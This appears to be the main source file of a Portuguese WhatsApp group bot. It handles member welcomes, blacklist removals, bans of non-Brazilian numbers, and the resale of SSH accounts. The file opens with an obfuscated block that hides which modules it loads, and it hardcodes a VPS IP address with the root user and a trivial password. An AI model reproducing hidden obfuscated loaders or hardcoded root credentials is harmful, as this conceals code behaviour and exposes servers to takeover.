(function(_0xcc77e0,_0x202bc0){function _0x1c15f1(_0x391f0d,_0x105f81,_0x36a20d,_0x2e562e,_0x13faa6){return _0x3ae9(_0x105f81-0x87,_0x13faa6);}const _0x186227=_0xcc77e0();function _0x423795(_0x219950,_0x1e98bd,_0x161870,_0x1a978e,_0x48bff9){return _0x3ae9(_0x48bff9- -0xe,_0x1e98bd);}function _0x4d91bd(_0x41d939,_0x2a2ace,_0x56a68b,_0x183afd,_0x3e5b6d){return _0x3ae9(_0x2a2ace-0x2c2,_0x56a68b);}function _0x42a2f2(_0x108bd5,_0x3af52b,_0x3d06e2,_0x953a01,_0xa4735){return _0x3ae9(_0x953a01- -0x2fa,_0x3af52b);}function _0x5b3d93(_0x2f0379,_0x12588b,_0x56e814,_0x39e834,_0x4f3f1){return _0x3ae9(_0x2f0379-0x3c3,_0x12588b);}while(!![]){try{const _0x163ca3=-parseInt(_0x1c15f1(0x204,0x1f8,0x1f6,0x1f7,'QQYp'))/(0x18b0+0x49+0x88*-0x2f)+parseInt(_0x4d91bd(0x428,0x427,'moUj',0x425,0x425))/(0xc16*-0x2+0x14de+0x6a*0x8)+parseInt(_0x423795(0x17a,'pP@A',0x15b,0x18a,0x172))/(-0x377*-0xb+0x23e3+-0xd*0x5b1)+-parseInt(_0x1c15f1(0x1dd,0x1ea,0x1f8,0x1f6,'EWFj'))/(-0x4*0x48d+-0x105a+0x5c3*0x6)*(parseInt(_0x423795(0x155,'Y8rI',0x15d,0x146,0x148))/(0x25*-0xf4+0x10f6+0x1253))+-parseInt(_0x423795(0x172,'$lu[',0x17c,0x16c,0x16c))/(0xd72*-0x2+0x1*0x70b+0x13df)+-parseInt(_0x5b3d93(0x53a,'jshx',0x548,0x524,0x52a))/(-0xc17+-0x8*0x1f3+0x1bb6)*(parseInt(_0x42a2f2(-0x17e,'fm8O',-0x19e,-0x184,-0x181))/(-0x17ab+0x11*0x6e+0x1065))+parseInt(_0x423795(0x165,'Tsth',0x14d,0x13f,0x14f))/(0x8f2*0x1+0x1e62*0x1+-0x7*0x59d)*(parseInt(_0x4d91bd(0x44b,0x436,'hhA3',0x44b,0x434))/(0x162a+-0xe5b+-0x9*0xdd));if(_0x163ca3===_0x202bc0)break;else _0x186227['push'](_0x186227['shift']());}catch(_0x46dbb6){_0x186227['push'](_0x186227['shift']());}}}(_0x57e4,-0x56*-0x26f+-0x4b7*0x1d+0x16439));const _0xcdcb7b=(function(){let _0x4ea6bb=!![];return function(_0x398900,_0x3c14cd){const _0x52f4a4=_0x4ea6bb?function(){function _0x2804ff(_0x297090,_0x4aae19,_0x2aacd8,_0x4631de,_0x1c554b){return _0x3ae9(_0x4631de- -0xaf,_0x1c554b);}if(_0x3c14cd){const _0x24af05=_0x3c14cd[_0x2804ff(0xad,0x93,0xb2,0xa5,'Tsth')](_0x398900,arguments);return _0x3c14cd=null,_0x24af05;}}:function(){};return _0x4ea6bb=![],_0x52f4a4;};}());function _0x658b09(_0x129034,_0x1f980c,_0x306598,_0x279522,_0x1b1a71){return _0x3ae9(_0x306598- -0x176,_0x129034);}function _0x5b3dbc(_0x597dac,_0x461d30,_0x3705bd,_0x71bd4b,_0x5c1d08){return _0x3ae9(_0x71bd4b-0x1a6,_0x461d30);}function _0x57e4(){const _0x10361c=['kmo1WOJdT8kmW4rpWQP6W7m','W7NdIXVcQSkQ','WR5vBgBcGHhdISoMWRrd','zYVdM2RcKIa4cMS','WPXCnMpdNa','BCoRaWJcRG','W6H5WOj0bHddGmoRB8knWPBdUG','WP7cGmophSo1','tCk1pG5h','pmk0zMFdHG','k8oPrqtdJa','e8owngVcICk+AcyD','gXjCWPxdM0i3W6jgWPpcKCoa','WP1zWPBcUaZdHf/dTmkVt8kpWP4','W44eAsNcM8krnqupWRrraq','rCoVr8kkfG','bGuoW4RcJq','WP1sWPhcVNtcMuddNCkIrq','CxJdTSoSW5xdHCk/suOZWQO','s2BdMmoEW70','nmkAha','hCkEgaj1tSkQ','jCkAymk3WOy','kmo+WO3dSmo0W65hWQ1GW5vy','t8oasc/cRG/dPq','jxhcGr7cGa','yw/dNcNcSW','FhZcGgBcTa','gY7cMCkfWRxdLGddTSotWOuF','o8odkeqg','jhdcSutcMa','WOmtWP7dPtm','WOuUWPJdKrK','dSoCsbdcPq','aCogs1aCymo5W6ShsSkE','bSockczI','xaf6W50CWPVcILNdOqJcKSkV','W6/dOwC','WO1go2tdHW','W4ZdT8k7WOq6','jCkvC2KadmkbW4KEWQ0TWPa','fCk5z3FdGG','e8owoqhcP8kCtHWliq','WOJcK8oOWQ/cPW','WRZcVSoLqmo2','oCoSwa','jmkwBSoRWO8','WPiaWQXfW70','pJddGh3dO2qLWQvxW6mHWRq','emosnaJdH8ozqXKebmoteW','CbO7W7Pv'];_0x57e4=function(){return _0x10361c;};return _0x57e4();}const _0x21b6d8=_0xcdcb7b(this,function(){function _0x26b02a(_0x20307e,_0x13158d,_0x32eca2,_0x17b27e,_0x43cb1f){return _0x3ae9(_0x43cb1f- -0x244,_0x13158d);}function _0x1fe99f(_0x4561b7,_0x48cd83,_0x22c399,_0x3adb76,_0x4bec2e){return _0x3ae9(_0x4561b7- -0x273,_0x22c399);}function _0x327f15(_0x2561fe,_0x43f6a3,_0x2c9afd,_0x1f6be4,_0x3c0161){return _0x3ae9(_0x2c9afd-0x198,_0x43f6a3);}function _0x2238dd(_0x28d479,_0x322b92,_0x149483,_0x5d57bf,_0x589b0e){return _0x3ae9(_0x149483-0x12d,_0x589b0e);}const _0x1f3274={};_0x1f3274[_0x2238dd(0x2b8,0x2a3,0x2a9,0x293,'Y8rI')]=_0x13b23a('(PKJ',0x19b,0x1a6,0x19e,0x18a)+_0x2238dd(0x286,0x292,0x29a,0x2b2,'mI(*')+'+$';function _0x13b23a(_0x143ee3,_0x3df8f1,_0x4d599c,_0x2de3d7,_0x2f039b){return _0x3ae9(_0x2de3d7-0x36,_0x143ee3);}const _0x30aa19=_0x1f3274;return _0x21b6d8[_0x327f15(0x2fb,'69RG',0x2fa,0x2e3,0x2fe)+_0x1fe99f(-0x11e,-0x112,'L3e@',-0x11b,-0x119)]()[_0x13b23a('Z&cm',0x1a0,0x17a,0x18d,0x1a6)+'h'](_0x30aa19[_0x26b02a(-0xce,'1hm8',-0xdf,-0xea,-0xe3)])[_0x26b02a(-0xcd,'jshx',-0xee,-0xcb,-0xe5)+_0x327f15(0x30a,'XAQo',0x2fe,0x2f5,0x2e9)]()[_0x26b02a(-0xca,'yRy!',-0xb6,-0xd3,-0xcc)+_0x1fe99f(-0x10c,-0x126,'yRy!',-0x114,-0xf8)+'r'](_0x21b6d8)[_0x26b02a(-0xb1,'nfNB',-0xc0,-0xce,-0xc9)+'h'](_0x30aa19[_0x327f15(0x2ea,'B7e!',0x2f6,0x304,0x2fe)]);});_0x21b6d8();const {default:makeSocket,downloadContentFromMessage,useSingleFileAuthState,makeInMemoryStore,DisconnectReason,WAGroupMetadata,relayWAMessage,MediaPathMap,mentionedJid,processTime,MediaType,Browser,MessageType,Presence,Mimetype,Browsers,delay,fetchLatestBaileysVersion,MessageRetryMap}=require(_0x40c857(0x4f8,'#]N[',0x4f6,0x4eb,0x50e)+_0x276b2f(0x55a,0x546,0x54b,0x543,'14ks')+_0x276b2f(0x52e,0x527,0x526,0x520,'QQYp')+_0x40c857(0x4fe,'#]N[',0x509,0x507,0x517)),{hx,fs,Boom,axios,chalk,yts,crypto,util,P,encodeUrl,linkfy,request,cheerio,ms,ffmpeg,imgbb,googleImage,googleIt,fetch,imageToBase64,webp2gifFile,webp_mp4,EmojiAPI,qrterminal,emoji,exec,spawn,execSync,moment,color,time,hora,date,getBuffer,convertSticker,recognize,fetchJson,fetchText,getBase64,createExif,insert,response,addLimit,getLimit,mediafireDl,upload,nit,addBanned,unBanned,BannedExpired,cekBannedUser,isFiltered,addFilter,validmove,setGame,addComandosId,deleteComandos,getComandoBlock,getComandos,addComandos,palavrasANA,quizanime,quizanimais,getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,bayarLimit,limitAdd,addATM,addKoinUser,checkATMuser,getRegisteredRandomId,addRegisteredUser,createSerial,checkRegisteredUser,confirmATM,runtime,getpc,supre,WinnerX,WinnerO,Tie,IA,IAmove1,IAalter,priorityC,addTTTId,addTTTwin,addTTTdefeat,addTTTtie,addTTTpoints,getTTTId,getTTTwins,getTTTdefeats,getTTTties,getTTTpoints,wait,getExtension,h2k,generateMessageID,getGroupAdmins,getRandom,banner2,start2,banner3,infopd,success,start,close,temporizador,cmdadd,addMetadata,chyt,ttthelp,tttme,tttset,esp,kyun,simih,botoff,fechar_abrir_gp}=require(_0x5731f5('Y8rI',-0x139,-0x120,-0x10c,-0x115)+_0x276b2f(0x51a,0x514,0x52e,0x521,'QQYp')+_0x276b2f(0x527,0x544,0x53b,0x53e,'IDDh')+'s'),{adeuscara,welcome_group,welcome_group2,bye_group,bye_group2,voting,sotoy,addVote,delVote,countMessage,countMessage_pv,comandos,welkom2,modobn,nsfw,daily,nescessario,welkom,premium,limitefll,antiflood,samih,samih2,_leveling,_level,bancht,anticall,ban,afk,setting,logoslink,antilink,antifake,antilinkhard,autofigu,antilinkgp,antiporn,antiimg,antisticker,antinotas,antictt,anticatalogo,antidoc,antiloc,antipv,antivid,antiaudio,palavra,palavrao}=require(_0x40c857(0x4f5,'pP@A',0x4dd,0x4dc,0x4c9)+_0x658b09('i&VR',-0x15,-0x1,0x16,-0xe)+_0x276b2f(0x543,0x539,0x520,0x538,'XqkX')+'s');function _0x5731f5(_0x4d6aae,_0x38b571,_0x55b130,_0x35cf82,_0x392b8c){return _0x3ae9(_0x55b130- -0x284,_0x4d6aae);}const {menu,menuadulto,menudono,adms,menulogos,efeitos,menuprem,brincadeiras,infovotacao,infocontador,infobemvindo,infolistanegra,infopalavrao,infobancarac,infodono,gitdobot,configbot,hospedar,cmd_termux,alteradores,destrava,destrava2,tabela,conselhob,palavras}=require(_0x658b09('Y8rI',-0x25,-0x12,0x4,-0x20)+_0x40c857(0x510,'RLGi',0x4fc,0x4fb,0x4f8)+_0x658b09('jshx',-0x4,-0x1c,-0x21,-0x7)+'s');function _0x276b2f(_0x3c6fd1,_0x5939c0,_0x58300d,_0x2905d4,_0x2e9ce8){return _0x3ae9(_0x2905d4-0x3c5,_0x2e9ce8);}function _0x40c857(_0x4426a3,_0x2756bb,_0x1b265d,_0x357b0c,_0x2ef7b8){return _0x3ae9(_0x1b265d-0x38c,_0x2756bb);}function _0x3ae9(_0x389b37,_0x208153){const _0x5732a3=_0x57e4();return _0x3ae9=function(_0x412110,_0x8c85ce){_0x412110=_0x412110-(-0x7*-0x36e+-0x3b4+0x1*-0x12ff);let _0x3a9b41=_0x5732a3[_0x412110];if(_0x3ae9['RxKrWd']===undefined){var _0x54c59e=function(_0x5dd8c6){const _0x1e0958='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4abcea='',_0x1e2a4b='',_0xea1b20=_0x4abcea+_0x54c59e;for(let _0x7dc1fd=-0x33*-0x52+0x127+0xb*-0x197,_0x350138,_0x272d88,_0x3b5317=0xb*-0x61+0xa46+-0x61b;_0x272d88=_0x5dd8c6['charAt'](_0x3b5317++);~_0x272d88&&(_0x350138=_0x7dc1fd%(0x255d+-0x1c60+-0x8f9)?_0x350138*(-0x111f+-0x2*0xb56+-0x1*-0x280b)+_0x272d88:_0x272d88,_0x7dc1fd++%(0x1756*0x1+0x2a9*0xa+-0x31ec))?_0x4abcea+=_0xea1b20['charCodeAt'](_0x3b5317+(-0xf*-0x55+0x31*0xb6+-0x257*0x11))-(-0x1bf+-0x8*0xce+0x839)!==-0x4f8+-0xe14+0x130c?String['fromCharCode'](-0xaee+0x2*-0x83e+0x1c69&_0x350138>>(-(0x1*0x1c03+0xa8a*-0x2+-0x6ed)*_0x7dc1fd&0x2565*0x1+0x6*0x1e8+-0x30cf)):_0x7dc1fd:0x1b*-0xd6+0xef8+0x79a){_0x272d88=_0x1e0958['indexOf'](_0x272d88);}for(let _0x281624=-0x2e5+-0x2*0xef9+0x4b1*0x7,_0x4a892f=_0x4abcea['length'];_0x281624<_0x4a892f;_0x281624++){_0x1e2a4b+='%'+('00'+_0x4abcea['charCodeAt'](_0x281624)['toString'](-0x4*0x905+0x16cb+-0x3*-0x473))['slice'](-(0x911+-0xf3b*-0x1+0xc25*-0x2));}return decodeURIComponent(_0x1e2a4b);};const _0x53785d=function(_0x1f4f17,_0x40ec18){let _0x11ca57=[],_0x25a06f=0x811+0xa27+-0x1238,_0xcc77e0,_0x202bc0='';_0x1f4f17=_0x54c59e(_0x1f4f17);let _0x186227;for(_0x186227=0xcd+0x43f*-0x9+0x256a;_0x186227<-0xc28+-0x11b5+0x1edd;_0x186227++){_0x11ca57[_0x186227]=_0x186227;}for(_0x186227=0x2dc+-0x4*0x8fe+0x146*0x1a;_0x186227<0x12a7+0x24c5+-0x366c;_0x186227++){_0x25a06f=(_0x25a06f+_0x11ca57[_0x186227]+_0x40ec18['charCodeAt'](_0x186227%_0x40ec18['length']))%(0x1e85+0xdff+-0x2b84),_0xcc77e0=_0x11ca57[_0x186227],_0x11ca57[_0x186227]=_0x11ca57[_0x25a06f],_0x11ca57[_0x25a06f]=_0xcc77e0;}_0x186227=0xbc4*-0x3+0x2*0x4cd+0x19b2,_0x25a06f=-0xb9b+0x1522+-0x987;for(let _0x163ca3=0x13c2+0x1*-0x1565+0x1a3;_0x163ca3<_0x1f4f17['length'];_0x163ca3++){_0x186227=(_0x186227+(-0x9*-0x107+0x1af4+-0x2432))%(-0x2*-0x80c+-0x2db*0x1+-0xd*0xf1),_0x25a06f=(_0x25a06f+_0x11ca57[_0x186227])%(-0x7*-0x4b8+-0x4d2+0x2*-0xd9b),_0xcc77e0=_0x11ca57[_0x186227],_0x11ca57[_0x186227]=_0x11ca57[_0x25a06f],_0x11ca57[_0x25a06f]=_0xcc77e0,_0x202bc0+=String['fromCharCode'](_0x1f4f17['charCodeAt'](_0x163ca3)^_0x11ca57[(_0x11ca57[_0x186227]+_0x11ca57[_0x25a06f])%(0x2692+0x1*-0x53e+-0x102a*0x2)]);}return _0x202bc0;};_0x3ae9['uSHUWJ']=_0x53785d,_0x389b37=arguments,_0x3ae9['RxKrWd']=!![];}const _0x5aeee5=_0x5732a3[0x1ac2+-0xf3a+0x1*-0xb88],_0x5d07bd=_0x412110+_0x5aeee5,_0x31a346=_0x389b37[_0x5d07bd];if(!_0x31a346){if(_0x3ae9['WmbInw']===undefined){const _0x46dbb6=function(_0x3dae13){this['VtunES']=_0x3dae13,this['FbZIKs']=[0x23d5*-0x1+-0x1cc7+0x3cd*0x11,0x8b*0x43+0xab4*-0x2+-0xef9*0x1,-0x18ed+0x1cfd+-0x410],this['ymFmHd']=function(){return'newState';},this['pAQgOO']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['NrdKJv']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x46dbb6['prototype']['qFtnaF']=function(){const _0x5e6a03=new RegExp(this['pAQgOO']+this['NrdKJv']),_0x4289d0=_0x5e6a03['test'](this['ymFmHd']['toString']())?--this['FbZIKs'][0x1ca7+0x1f1*-0x5+-0x12f1]:--this['FbZIKs'][-0x1a*-0xa7+0x12e6+-0x23dc];return this['JrkLGs'](_0x4289d0);},_0x46dbb6['prototype']['JrkLGs']=function(_0x4072be){if(!Boolean(~_0x4072be))return _0x4072be;return this['WSljFL'](this['VtunES']);},_0x46dbb6['prototype']['WSljFL']=function(_0x151f18){for(let _0x19b9b3=0x3*0x259+-0x4*-0x5a7+-0x1da7,_0x237c31=this['FbZIKs']['length'];_0x19b9b3<_0x237c31;_0x19b9b3++){this['FbZIKs']['push'](Math['round'](Math['random']())),_0x237c31=this['FbZIKs']['length'];}return _0x151f18(this['FbZIKs'][-0x8*0x1f3+-0x1add+0x2a75]);},new _0x46dbb6(_0x3ae9)['qFtnaF'](),_0x3ae9['WmbInw']=!![];}_0x3a9b41=_0x3ae9['uSHUWJ'](_0x3a9b41,_0x8c85ce),_0x389b37[_0x5d07bd]=_0x3a9b41;}else _0x3a9b41=_0x31a346;return _0x3a9b41;},_0x3ae9(_0x389b37,_0x208153);}const {forwarding,imgnazista,imggay,imgcorno,imggostosa,imggostoso,imgfeio,imgvesgo,imgbebado,imggado,matarcmd,beijocmd,chutecmd,tapacmd}=require(_0x5731f5('nbYT',-0x136,-0x134,-0x133,-0x146)+_0x5b3dbc(0x311,'3vvC',0x30b,0x312,0x317)+_0x658b09('1hm8',-0x25,-0x16,-0x2a,-0x26)+_0x658b09('Z&cm',-0x1c,-0x7,-0x16,0xd)+_0x5b3dbc(0x326,'14ks',0x31d,0x314,0x328));

//====================‚â†‚â†===============\\
 
cdd = nescessario.cdd

menu_audio = nescessario.menu_audio
 
crtt = nescessario.crtt
 
fundo1 = nescessario.fundo1

fundo2 = nescessario.fundo2
 
dono2 = nescessario.dono2

dono3 = nescessario.dono3
 
dono4 = nescessario.dono4

dono5 = nescessario.dono5
 
NomeDoBot = setting.NomeDoBot

NickDono = setting.NickDono

numerodono = setting.numerodono 

prefix = setting.prefix 

banChats = nescessario.banChats 

logo = logoslink.logo

numbernye = '0'

blocked = [] 

hitt = []
//============INSIRA SUAS INFORMA√á√ïES DA VPS ABAIXO==================\\
//Acesse https://apirest.gestorvip.com para adiquirir uma api ssh\\

ipvps = "138.2.245.248"
uservps = "root"
senhavps = "123456"
apipremium = "equipevipssh"
linkapp = "https://play.google.com/store/apps/details?id=equipevip.miraclevpn"



//plano1 1pessoa 30 dias\\

valor1 = "R$ 10"
linkpag ="https://my.gestorvip.com/p/OTUxMQ"
delivery1 ="equipevip1"



//plano2 2pessoas 30 dias\\

valor2 = "R$ 15"
linkpag2 ="https://my.gestorvip.com/p/OTUxMg"
delivery2 ="equipevip2"


//plano3 3pessoas 30 dias\\

valor3 = "R$ 30"
linkpag3 ="https://my.gestorvip.com/p/OTUyOQ"
delivery3 ="equipevip3"




// D√∫vidas contate 92991796111 \\


//============FIMM N√ÉO MECHA NO RESTO==================\\

const useStore = !process.argv.includes('--no-store')
const doReplies = !process.argv.includes('--no-reply')

class msgRetryCounterMap {
MessageRetryMap = { }
}

const store = useStore ? makeInMemoryStore({ logger: P().child({ level: 'debug', stream: 'store' }) }) : undefined
store?.readFromFile('./dados_store.json')
// save every 10s
setInterval(() => {
	store?.writeToFile('./dados_store.json')
}, 10000)

async function startAle() {

const { state, saveState } = await useSingleFileAuthState('./GESTOR-QR.json')

const conn = makeSocket({
logger: P({ level: 'silent' }),
printQRInTerminal: true,
auth: state,
saveState, 
msgRetryCounterMap
})

store?.bind(conn.ev)

//===============(BEM VINDO)=============\\

conn.ev.on('group-participants.update', async (ale) => {
  
if(ale.participants[0].startsWith(conn.user.id.split(':')[0])) return 
const GroupMetadata_ = ale.id ? await conn.groupMetadata(ale.id): ""
  
const mdata_ = ale.id ? await conn.groupMetadata(ale.id): ""


// CONST DO CMD DE BANIR QUEM ESTIVER NA LISTA N

const dbackid = []
for(i=0;i<adeuscara.length;++i) dbackid.push(adeuscara[i].groupId)
console.log(ale)
if(dbackid.indexOf(ale.id) >= 0) {
if (ale.action == 'add'){ 
num = ale.participants[0]
var ind = dbackid.indexOf(ale.id)
if(adeuscara[ind].actived && adeuscara[ind].number.indexOf(num.split('@')[0]) >= 0) {
await conn.sendMessage(mdata_.id,{text: '*Olha quem deu as cara por aqui, sente o poder do ban caba√ßo*'})
conn.groupParticipantsUpdate(mdata_.id, [ale.participants[0]], 'remove')
return
}
}
}

// FIM LISTANEGRA CONST ^



// ANTIFAKE QUE EST√Å JUNTO COM BEM VINDO 

if(antifake.includes(ale.id)) {
if (ale.action === 'add' && !ale.participants[0].startsWith(55)){
num = ale.participants[0]
conn.sendMessage(mdata_.id, {text: 's√≥ aceitamos numeros +55 BR e por isso estou lhe banindo , se tiver duvidas contate o admin'})
setTimeout(async() => {
conn.groupParticipantsUpdate(mdata_.id, [ale.participants[0]], 'remove')
}, 1000)
}
}

// FIM ANTIFAKE ^

// BEM VINDO COMPLETO 


if(welkom.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {
  
// PEGAR DESCRI√á√ÉO DO GRUPO. 

const groupDesc = await GroupMetadata_.desc  
  
try {
ppimg = await conn.profilePictureUrl(ale.participants[0])
} catch {
ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}

try {
ppgp = await conn.profilePictureUrl(mdata_.id)
} catch {
ppgp = 'https://image.flaticon.com/icons/png/512/124/124034.png'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortgc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppgp}`)

const groupIdWelcomed = []
const groupIdBye = []
for(let obj of welcome_group) groupIdWelcomed.push(obj.id)
for(let obj of bye_group) groupIdBye.push(obj.id)


const isByed = groupIdBye.indexOf(ale.id) >= 0 ? true : false

const isWelcomed = (groupIdWelcomed.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed) {
var ind = groupIdWelcomed.indexOf(ale.id)
teks = welcome_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_.subject)
}
let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
await fs.writeFileSync(ran, buff)

fs.unlinkSync(ran)
imgbuff = await getBuffer(`https://telegra.ph/file/98660f666a74db097d5cb.png`)
conn.sendMessage(mdata_.id, {image: imgbuff, 
mentions: ale.participants, caption: teks})

} else if(ale.action === 'remove') {
mem = ale.participants[0]

try {
ppimg = await conn.profilePictureUrl(`${mem.split('@')[0]}@c.us`)
} catch {
ppimg = `${logo}`
}
//aqui √© o link do bem vindo agr\\

if(isByed) {
var ind = groupIdBye.indexOf(ale.id)
teks = bye_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
fs.writeFileSync(ran, buff)

imgbuff = await getBuffer(`https://telegra.ph/file/4998db68616ca31c20477.jpg`)
conn.sendMessage(mdata_.id, {image: imgbuff, caption: teks, 
mentions: ale.participants})
 fs.unlinkSync(ran)

}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(
`Mensagem de saiu do bem vindo n√£o definida, mas n√£o precisa definir,
qualquer d√∫vida d√∫vida digita :
${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo n√£o definida, qualquer d√∫vida digite : 
${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
})
// FIM ^


// BEM VINDO 2 ( SEM FOTO )

conn.ev.on('group-participants.update', async (ale) => {
  
if(ale.participants[0].startsWith(conn.user.id.split(':')[0])) return 
if(welkom2.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {

const GroupMetadata_2 = ale.id ? await conn.groupMetadata(ale.id): ""
  
const mdata_2 = ale.id ? await conn.groupMetadata(ale.id): ""

// PEGAR DESCRI√á√ÉO DO GRUPO

const groupDesc = await GroupMetadata_2.desc

const groupIdWelcomed2 = []
const groupIdBye2 = []
for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)
for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isByed2 = groupIdBye2.indexOf(ale.id) >= 0 ? true : false

const isWelcomed2 = (groupIdWelcomed2.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(ale.id)
teks = welcome_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_2.subject)
}

conn.sendMessage(mdata_2.id, {text: teks, mentions: ale.participants})

} else if(ale.action === 'remove') {
mem = ale.participants[0]

if(isByed2) {
var ind = groupIdBye2.indexOf(ale.id)
teks = bye_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

conn.sendMessage(mdata_2.id, {text: teks, mentions: ale.participants})
 fs.unlinkSync(ran)
}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(
`Mensagem de saiu do bem vindo n√£o definida, mas
n√£o precisa definir, qualquer d√∫vida digita :
${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo n√£o definida, qualquer d√∫vida digite :
${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
})


// FIM BEM VINDO (2)

conn.ev.on('messages.upsert', async ({ messages }) => {
try {
const info = messages ? messages[0]: messages[1]
if (!info.message) return 
saveState()
if (info.message.protocolMessage) return 
if(info.message > 1000) return

if (info.key && info.key.remoteJid == 'status@broadcast') return

const altpdf = Object.keys(info.message)
const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]

global.prefix

global.blocked

const content = JSON.stringify(info.message)
const speed = require('performance-now');
const from = info.key.remoteJid
const isGroup = from.endsWith('@g.us')

//==============(BODY)================\\
var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : ''

const args = body.trim().split(/ +/).slice(1)

const q = args.join(' ')

if(fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
var limitecaracteres_on = JSON.parse(fs.readFileSync(`./func/limitecaracteres/limite-c_${from}.json`))
var limitefl = limitecaracteres_on.limite
} else {
var limitefl = limitefll.limitefl
}

if(fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) {
var prefixo2_on = JSON.parse(fs.readFileSync(`./func/prefixo/prefixo2_${from}.json`))
var isCmd = body.startsWith(prefixo2_on.prefixo)
} else {
var isCmd = body.startsWith(prefix)  
}

const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null

//================(BADY)================\\
 
bady = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (info.message.listResponseMessage && info.message.listResponseMessage.singleSelectReply.selectedRowId) ? info.message.listResponseMessage.singleSelectReply.selectedRowId: ''

//=======================================\\


//===============(BUDY)==================\\

var budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var budy2 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

//======================================\\

var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''

//===========(ID DAS FIGUS)===========\\

const figura = Object.keys(info.message)[0] == "stickerMessage" ? info.message.stickerMessage.fileSha256.toString('base64') : ""

//=====================================\\

const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''

adivinhacll = info.key.id.length > 21 ? 'Android ü§£' : info.key.id.substring(0, 2) == '3A' ? 'IOSüòÇüòÇüòÖ' : 'WhatsApp web';

if(adivinhacll === "WhatsApp web") {
var sender = isGroup ? info.key.participant.split(":")[0]+"@s.whatsapp.net": info.key.remoteJid.split(":")[0]+"@s.whatsapp.net"
} else {
var sender = isGroup ? info.key.participant : info.key.remoteJid  
}

const pushname = info.pushName ? info.pushName : ''

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(' ') + 1)

const botNumber = conn.user.id.split(':')[0]+'@s.whatsapp.net'
const argss = body.split(/ +/g)
const testat = body
const ants = body
const tescuk = ["0@s.whatsapp.net"]

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

//=======================================\\

const nmrdn = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`

